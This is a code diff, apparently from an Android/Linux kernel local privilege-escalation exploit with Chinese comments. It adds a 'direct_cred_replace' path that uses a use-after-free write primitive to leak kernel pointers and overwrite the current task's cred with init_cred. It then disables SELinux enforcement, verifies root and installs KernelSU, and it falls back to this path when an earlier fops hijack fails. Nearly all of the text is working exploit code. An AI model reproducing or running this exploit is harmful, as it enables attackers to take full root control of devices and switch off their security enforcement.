@@ -768,6 +768,171 @@ int install_child_root(int fd) {
   return root_stage(fd);
 }
 
+/*
+ * direct_cred_replace: Linuxoid-cn 方式 — 直接用 pselect write 替换 cred
+ *
+ * 不依赖 fops hijack / configfs R/W / pipe physrw。
+ * 每次写入 fork 子进程准备新内核页，触发新的 UAF + PI chain walk。
+ *
+ * 流程:
+ *   1. 泄漏 per_cpu_offset → entry_task → task_struct
+ *   2. 写 init_cred → task->real_cred
+ *   3. 写 init_cred → task->cred
+ *   4. 写 0 → selinux_enforcing
+ *   5. fork 子进程验证 uid=0
+ */
+static int direct_write_once(uintptr_t target, uint64_t value, int shape) {
+  pid_t child = fork();
+  if (child < 0) {
+    pr_warning("direct-w fork failed errno=%d\n", errno);
+    return 0;
+  }
+  if (child == 0) {
+    set_pselect_write(target, value, shape);
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+    if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
+      _exit(12);
+    }
+    if (!prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS)) {
+      _exit(13);
+    }
+    run_main_route_threads();
+    int ok = atomic_load(&route_done) &&
+             atomic_load(&consumer_calls) > 0 &&
+             atomic_load(&consumer_success) > 0;
+    _exit(ok ? 0 : 16);
+  }
+  int status = 0;
+  for (int i = 0; i < 300; i++) {
+    pid_t w = waitpid(child, &status, WNOHANG);
+    if (w == child) break;
+    if (w < 0 && errno != EINTR) return 0;
+    usleep(10000);
+  }
+  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
+}
+
+static int direct_read64(uintptr_t target, uint64_t *out) {
+  /* 用 boot_id sidecar 验证读取:
+   * shape=0: parent=value(boot_id_data), left=target
+   * rb_set_parent_color 写入 parent 到 waiter.__rb_parent_color
+   * boot_id 数据被覆写 → /proc/sys/kernel/random/boot_id 返回验证值 */
+  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
+  if (!is_direct_ptr(boot_id_data) || !is_kernel_ptr(target) ||
+      (boot_id_data & 7) != 0 || (target & 7) != 0) {
+    return 0;
+  }
+  if (!direct_write_once(boot_id_data, target, 0)) {
+    return 0;
+  }
+  /* 读取 boot_id 验证 */
+  unsigned char raw[16] = {0};
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return 0;
+  ssize_t n = read(fd, raw, 16);
+  close(fd);
+  if (n < 8) return 0;
+  uint64_t got = 0;
+  memcpy(&got, raw, 8);
+  uint64_t sidecar = 0;
+  memcpy(&sidecar, raw + 8, 8);
+  if (sidecar != (uint64_t)boot_id_data) {
+    pr_warning("direct-read sidecar mismatch got=%016llx want=%016zx\n",
+               (unsigned long long)sidecar, boot_id_data);
+    return 0;
+  }
+  *out = got;
+  return 1;
+}
+
+static int direct_cred_replace(void) {
+  fops_route_log("DIRECT_CRED_ENTER: pid=%d uid=%d kaslr=%d base=%016llx\n",
+                 getpid(), getuid(), kaslr_done,
+                 (unsigned long long)kaslr_base);
+  if (!kaslr_done) {
+    fops_route_log("DIRECT_CRED_FAIL: no KASLR base\n");
+    return 0;
+  }
+
+  /* 步骤 1: 泄漏 per_cpu_offset */
+  uintptr_t percpu_slot = data_addr(PER_CPU_OFFSET);
+  uint64_t percpu_delta = 0;
+  if (!direct_read64(percpu_slot, &percpu_delta)) {
+    fops_route_log("DIRECT_CRED_FAIL: per_cpu_offset leak failed\n");
+    return 0;
+  }
+  fops_route_log("DIRECT_PERCPU: delta=%016llx slot=%016llx\n",
+                 (unsigned long long)percpu_delta,
+                 (unsigned long long)percpu_slot);
+
+  /* 步骤 2: 泄漏 entry_task (当前 CPU 的 task_struct 指针) */
+  uintptr_t entry_slot = data_addr(ENTRY_TASK) + (uintptr_t)percpu_delta;
+  uint64_t task = 0;
+  if (!direct_read64(entry_slot, &task) || !is_kernel_ptr(task)) {
+    fops_route_log("DIRECT_CRED_FAIL: entry_task leak failed slot=%016llx\n",
+                   (unsigned long long)entry_slot);
+    return 0;
+  }
+  fops_route_log("DIRECT_TASK: task=%016llx\n", (unsigned long long)task);
+
+  /* 步骤 3: 写 init_cred → task->real_cred 和 task->cred */
+  uintptr_t init_cred = text_addr(INIT_CRED);
+  uintptr_t real_cred_slot = (uintptr_t)task + TASK_REAL_CRED_OFF;
+  uintptr_t cred_slot = (uintptr_t)task + TASK_CRED_OFF;
+
+  fops_route_log("DIRECT_WRITE: real_cred=%016llx cred=%016llx init_cred=%016llx\n",
+                 (unsigned long long)real_cred_slot,
+                 (unsigned long long)cred_slot,
+                 (unsigned long long)init_cred);
+
+  if (!direct_write_once(real_cred_slot, init_cred, 1)) {
+    fops_route_log("DIRECT_CRED_FAIL: real_cred write failed\n");
+    return 0;
+  }
+  fops_route_log("DIRECT_REAL_CRED: OK\n");
+
+  if (!direct_write_once(cred_slot, init_cred, 1)) {
+    fops_route_log("DIRECT_CRED_FAIL: cred write failed\n");
+    return 0;
+  }
+  fops_route_log("DIRECT_CRED: OK\n");
+
+  /* 步骤 4: 写 0 → selinux_enforcing */
+  uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
+  if (!direct_write_once(selinux_addr, 0, 1)) {
+    fops_route_log("DIRECT_SELINUX_FAIL: enforcing write failed\n");
+    /* SELinux 失败不阻塞 — cred 已经替换 */
+  } else {
+    fops_route_log("DIRECT_SELINUX: OK\n");
+  }
+
+  /* 步骤 5: fork 子进程验证 uid=0 */
+  pid_t verify = fork();
+  if (verify == 0) {
+    uid_t uid = getuid();
+    uid_t euid = geteuid();
+    fops_route_log("DIRECT_VERIFY: uid=%u euid=%u\n", uid, euid);
+    if (uid == 0 && euid == 0) {
+      /* 安装 KernelSU */
+      install_kernelsu_late_load();
+      _exit(0);
+    }
+    _exit(1);
+  }
+  int vs = 0;
+  waitpid(verify, &vs, 0);
+  int ok = WIFEXITED(vs) && WEXITSTATUS(vs) == 0;
+
+  fops_route_log("DIRECT_CRED_RESULT: ok=%d\n", ok);
+  if (ok) {
+    root_child_done = 1;
+    root_uid_after = 0;
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
+  }
+  return ok;
+}
+
 int try_cfi_stage(void) {
   cfi_attempts++;
   int fd = open_ashmem_device();
@@ -793,9 +958,12 @@ int try_cfi_stage(void) {
   cfi_write_ret = n;
   pr_info("cfi write ret=%zd errno=%d\n", n, errno);
   if (n != (ssize_t)sizeof(payload)) {
+    /* fops hijack 失败 (errno=22) — 尝试 direct cred 替换路径
+     * (Linuxoid-cn approach: 不依赖 fops hijack, 直接写 cred) */
     cfi_last_step = 1;
     cfi_last_errno = errno;
-    goto fail;
+    SYSCHK(close(fd));
+    return direct_cred_replace();
   }
   dirty = 1;
   cfi_dirty_seen = 1;
